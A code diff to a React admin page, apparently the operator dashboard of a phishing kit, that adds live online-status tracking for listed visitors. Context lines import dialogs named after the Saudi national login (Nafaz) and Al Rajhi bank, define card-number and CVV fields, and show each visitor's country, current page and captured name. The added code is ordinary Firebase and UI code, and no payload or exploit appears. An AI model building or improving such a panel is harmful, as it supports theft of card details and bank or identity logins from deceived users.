@@ -65,9 +65,71 @@ import NafazAuthDialog from "@/components/nafaz"
 import RajhiAuthDialog from "@/components/rajhi"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTitle } from "@/components/ui/sheet"
-import { auth, db } from "@/lib/firestore"
+import { auth, database, db } from "@/lib/firestore"
 import { Skeleton } from "@/components/ui/skeleton"
+import { onValue, ref } from "firebase/database"
+function useOnlineUsersCount() {
+  const [onlineUsersCount, setOnlineUsersCount] = useState(0)
 
+  useEffect(() => {
+    const onlineUsersRef = ref(database, "status")
+    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
+      const data = snapshot.val()
+      if (data) {
+        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
+        setOnlineUsersCount(onlineCount)
+      }
+    })
+
+    return () => unsubscribe()
+  }, [])
+
+  return onlineUsersCount
+}
+
+
+function UserStatus({ userId }: { userId: string }) {
+  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")
+
+  useEffect(() => {
+    const userStatusRef = ref(database, `/status/${userId}`)
+    const unsubscribe = onValue(userStatusRef, (snapshot) => {
+      const data = snapshot.val()
+      if (data) {
+        setStatus(data.state === "online" ? "online" : "offline")
+      } else {
+        setStatus("unknown") // Or 'offline' if unknown implies offline
+      }
+    })
+    return () => unsubscribe()
+  }, [userId])
+
+  return (
+    <Badge
+      variant={status === "online" ? "default" : "outline"}
+      className={`
+    ${
+      status === "online"
+        ? "bg-gradient-to-r from-emerald-500 to-emerald-600 border-emerald-500 text-white shadow-lg shadow-emerald-500/25"
+        : status === "offline"
+          ? "bg-gradient-to-r from-gray-100 to-gray-200 border-gray-300 text-gray-700 dark:from-gray-700 dark:to-gray-800 dark:border-gray-600 dark:text-gray-300"
+          : "bg-gradient-to-r from-amber-100 to-amber-200 border-amber-300 text-amber-700 dark:from-amber-700 dark:to-amber-800 dark:border-amber-600 dark:text-amber-300"
+    } text-xs px-2 py-0.5 transition-all duration-200
+  `}
+    >
+      <span
+        className={`mr-1.5 inline-block h-2 w-2 rounded-full ${
+          status === "online"
+            ? "bg-white animate-pulse"
+            : status === "offline"
+              ? "bg-gray-400"
+              : "bg-amber-400 animate-pulse"
+        }`}
+      ></span>
+      {status === "online" ? "متصل" : status === "offline" ? "غير متصل" : "غير معروف"}
+    </Badge>
+  )
+}
 interface PaymentData {
   cardNumber?: string
   cvv?: string
@@ -1082,6 +1144,7 @@ export default function NotificationsPage() {
               <Table>
                 <TableHeader>
                   <TableRow className="bg-gradient-to-r from-blue-50/80 to-purple-50/80 hover:from-blue-50/80 hover:to-purple-50/80 border-b border-blue-200/50">
+                    <TableHead className="text-right font-bold text-blue-700">الحالة</TableHead>
                     <TableHead className="text-right font-bold text-blue-700">الدولة</TableHead>
                     <TableHead className="text-right font-bold text-blue-700">الصفحة الحالية</TableHead>
                     <TableHead className="text-right font-bold text-blue-700">الاسم</TableHead>
@@ -1099,6 +1162,7 @@ export default function NotificationsPage() {
                       key={notification.id}
                       className="hover:bg-gradient-to-r hover:from-blue-50/30 hover:to-purple-50/30 border-b border-blue-100/50 relative cursor-pointer transition-all duration-200"
                     >
+                      <TableCell><UserStatus userId={notification?.id!}/></TableCell>
                       <TableCell>{notification?.country}</TableCell>
 
                       <TableCell>{getPageType(notification.pagename, true, notification)}</TableCell>
@@ -1108,8 +1172,9 @@ export default function NotificationsPage() {
                             <User className="h-4 w-4 text-blue-600" />
                           </div>
                           <Badge
-                            variant="outline"
-                            className="bg-gradient-to-r from-gray-50 to-slate-100 hover:from-gray-100 hover:to-slate-200 text-gray-800 border-2 border-gray-200 shadow-sm cursor-pointer transition-all duration-200 hover:shadow-md"
+                            variant={ notification.documment_owner_full_name ?"outline":"outline"}
+                            className={`${notification.documment_owner_full_name ?" bg-gradient-to-r from-blue-600 to-blue-500 ":
+                          "bg-gradient-to-r from-red-500 to-red-400"}  hover:from-gray-100 hover:to-slate-200 text-gray-100 border-2 border-gray-200 shadow-sm cursor-pointer transition-all duration-200 hover:shadow-md`}
                             onClick={() => handleInfoClick(notification, "personal")}
                           >
                             {notification.documment_owner_full_name ||
